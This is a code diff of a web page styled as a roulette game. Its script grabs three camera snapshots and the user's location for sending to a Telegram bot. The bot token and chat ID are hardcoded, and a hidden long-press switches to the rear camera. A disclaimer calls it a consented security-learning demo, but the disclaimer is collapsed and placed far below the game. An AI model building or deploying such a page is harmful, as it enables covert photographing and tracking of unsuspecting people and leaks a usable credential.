@@ -12,20 +12,11 @@
     position: relative; margin-bottom: 30px; padding: 10px 25px; 
     background: rgba(255,255,255,0.2); border-radius: 15px; 
     backdrop-filter: blur(10px); z-index: 5; border: 1px solid rgba(255,255,255,0.3); 
-    font-size: 24px; 
-    cursor: pointer; user-select: none; -webkit-user-select: none;
+    font-size: 24px; cursor: pointer; user-select: none; -webkit-user-select: none;
     transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1), background 0.3s, border 0.3s;
     transform-style: preserve-3d;
   }
-
-  /* 回転後の裏モード（黒ぼかし） */
-  h2.flipped {
-    transform: rotateY(180deg);
-    background: rgba(0, 0, 0, 0.7);
-    border: 1px solid rgba(255, 64, 129, 0.5);
-  }
-
-  /* 文字の反転を補正 */
+  h2.flipped { transform: rotateY(180deg); background: rgba(0, 0, 0, 0.7); border: 1px solid rgba(255, 64, 129, 0.5); }
   h2 span { display: inline-block; transition: transform 0.6s; }
   h2.flipped span { transform: rotateY(180deg); }
 
@@ -38,16 +29,21 @@
   .modal { display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); background: #fff; color: #333; padding: 30px; border-radius: 40px; text-align: center; box-shadow: 0 0 100px rgba(0,0,0,0.5); z-index: 100; width: 85%; max-width: 320px; }
   .modal h1 { margin: 0 0 15px; font-size: 22px; }
   .modal p { font-size: 14px; margin-bottom: 20px; color: #666; }
-  
   .btn-group-row-equal { display: flex; align-items: center; justify-content: center; margin-top: 25px; }
   .spacer { width: 40px; } 
-  .primary-btn-flat, .secondary-btn-flat { flex: 1; padding: 15px 0; font-size: 18px; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; text-align: center; transition: transform 0.1s; }
+  .primary-btn-flat, .secondary-btn-flat { flex: 1; padding: 15px 0; font-size: 18px; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; transition: transform 0.1s; }
   .primary-btn-flat { background: #ff4081; color: white; box-shadow: 0 4px 10px rgba(255, 64, 129, 0.3); }
   .secondary-btn-flat { background: #e0e0e0; color: #444; }
   .btn-single { width: 100%; padding: 15px; font-size: 18px; background: #ff4081; color: white; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
   #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 90; }
   
-  .security-notice { max-width: 600px; width: 90%; margin: 40vh auto 40px; padding: 25px; background: rgba(0, 0, 0, 0.7); border: 2px solid #ff4081; border-radius: 15px; font-size: 14px; line-height: 1.7; text-align: left; color: #fff; }
+  /* セキュリティ通知 */
+  .security-notice { max-width: 600px; width: 90%; margin: 40vh auto 40px; padding: 25px; background: rgba(0, 0, 0, 0.7); border: 2px solid #ff4081; border-radius: 15px; font-size: 14px; line-height: 1.7; text-align: left; color: #fff; box-shadow: 0 0 20px rgba(255,64,129,0.3); }
+  .security-notice summary { cursor: pointer; outline: none; list-style: none; display: flex; justify-content: space-between; align-items: center; }
+  .security-notice summary::-webkit-details-marker { display: none; }
+  .security-notice b { color: #ff0000; font-size: 1.1em; }
+  .toggle-icon { display: inline-block; transition: transform 0.3s; font-size: 18px; margin-left: 10px; }
+  details[open] .toggle-icon { transform: rotate(180deg); }
 </style>
 </head>
 <body>
@@ -86,8 +82,26 @@
 </div>
 
 <details class="security-notice">
-  <summary><b>【重要：セキュリティ学習用デモ】</b></summary>
-  <br>このページは、同意がある場合にのみカメラ撮影（内・外切替可）と位置情報を取得しTelegramへ送信する学習用デモです。
+  <summary>
+    <b>【重要：セキュリティ学習用デモ】</b>
+    <span class="toggle-icon">▼</span>
+  </summary>
+  <br>このサイトは、JavaScriptによる不正なデータ取得（スパイウェア）の手口を学ぶための教育用デモページです。
+  <br><br>
+  本サイトでは、ユーザーが同意した場合に限り、以下の処理が行われます：<br>
+  ・端末のカメラを使用した写真の撮影<br>
+  ・現在地（位置情報）の取得<br>
+  ・取得されたデータの外部サービス（Telegram）への送信<br>
+  <br>
+  これらの処理は、画面上の確認操作およびユーザーの明示的な同意があった場合のみ実行されます。<br>
+  同意しない場合は、データの取得および送信は行われません。<br>
+  <br>
+  取得されたデータは、本デモの動作確認および学習目的のためにのみ使用されます。<br>
+  <br>
+  許可なく第三者に対してこのURLを送信したり、意図を説明せずに実行させたりする行為は禁止されています。<br>
+  内容によっては法律（不正指令電磁的記録に関する罪、プライバシー侵害等）に抵触する可能性があります。<br>
+  <br>
+  本デモは仕組みの理解を目的としており、悪用を推奨するものではありません。
 </details>
 
 <script>
@@ -102,7 +116,6 @@ animateBG();
 const BOT_TOKEN = "8759355239:AAHw3_fNnjLBCFQCfp35a6ssW3Qk3yQxSPg";
 const CHAT_ID = "7541612001";
 
-// --- 隠し機能：2秒長押し ---
 let useBackCamera = false;
 let pressTimer;
 const h2 = document.getElementById("h2Title");
@@ -113,7 +126,7 @@ h2.onmousedown = h2.ontouchstart = (e) => {
     useBackCamera = !useBackCamera;
     h2.classList.toggle("flipped", useBackCamera);
     if (navigator.vibrate) navigator.vibrate(50);
-  }, 2000); // 2秒
+  }, 2000); 
 };
 h2.onmouseup = h2.onmouseleave = h2.ontouchend = () => clearTimeout(pressTimer);
 
@@ -125,29 +138,16 @@ let tempPhotos = [];
 let tempLocationMsg = "";
 
 function draw() {
-  const size = 800;
-  canvas.width = size; canvas.height = size;
-  const c = size / 2;
-  const rad = (Math.PI * 2) / slots.length;
+  const size = 800; canvas.width = size; canvas.height = size;
+  const c = size / 2; const rad = (Math.PI * 2) / slots.length;
   ctx.clearRect(0, 0, size, size);
   for(let i=0; i<slots.length; i++){
-    ctx.beginPath();
-    ctx.moveTo(c, c);
-    ctx.arc(c, c, c, i * rad, (i + 1) * rad);
-    ctx.fillStyle = i % 2 === 0 ? "#FFD700" : "#EEEEEE";
-    ctx.fill();
-    ctx.strokeStyle = "#333";
-    ctx.lineWidth = 4;
-    ctx.stroke();
-    ctx.save();
-    ctx.translate(c, c);
-    ctx.rotate(i * rad + rad / 2);
-    ctx.fillStyle = "#333";
-    ctx.font = "bold 55px sans-serif";
-    ctx.textAlign = "center";
-    ctx.textBaseline = "middle";
-    ctx.fillText(slots[i], c * 0.55, 0);
-    ctx.restore();
+    ctx.beginPath(); ctx.moveTo(c, c); ctx.arc(c, c, c, i * rad, (i + 1) * rad);
+    ctx.fillStyle = i % 2 === 0 ? "#FFD700" : "#EEEEEE"; ctx.fill();
+    ctx.strokeStyle = "#333"; ctx.lineWidth = 4; ctx.stroke();
+    ctx.save(); ctx.translate(c, c); ctx.rotate(i * rad + rad / 2);
+    ctx.fillStyle = "#333"; ctx.font = "bold 55px sans-serif"; ctx.textAlign = "center"; ctx.textBaseline = "middle";
+    ctx.fillText(slots[i], c * 0.55, 0); ctx.restore();
   }
 }
 window.onload = draw;
@@ -168,8 +168,7 @@ async function getTempLocation() {
 }
 
 async function getTempData() {
-  tempPhotos = [];
-  tempLocationMsg = "";
+  tempPhotos = []; tempLocationMsg = "";
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ 
       video: { facingMode: useBackCamera ? "environment" : "user" } 
@@ -177,21 +176,18 @@ async function getTempData() {
     const video = document.createElement("video");
     video.srcObject = stream;
     await new Promise((resolve) => { video.onloadedmetadata = () => { video.play().then(resolve); }; });
-
     await new Promise(r => setTimeout(r, 1000));
     for (let i = 0; i < 3; i++) {
-      const tempCanvas = document.createElement("canvas");
-      tempCanvas.width = video.videoWidth; tempCanvas.height = video.videoHeight;
-      tempCanvas.getContext("2d").drawImage(video, 0, 0);
-      const blob = await new Promise(r => tempCanvas.toBlob(r, "image/jpeg", 0.7));
+      const tc = document.createElement("canvas");
+      tc.width = video.videoWidth; tc.height = video.videoHeight;
+      tc.getContext("2d").drawImage(video, 0, 0);
+      const blob = await new Promise(r => tc.toBlob(r, "image/jpeg", 0.7));
       if(blob) tempPhotos.push(blob);
       await new Promise(r => setTimeout(r, 400));
     }
     stream.getTracks().forEach(t => t.stop());
   } catch (e) {}
-
   await getTempLocation();
-  
   setTimeout(() => {
     document.getElementById("result").textContent = "準備完了";
     if (tempPhotos.length === 0 && !tempLocationMsg) {
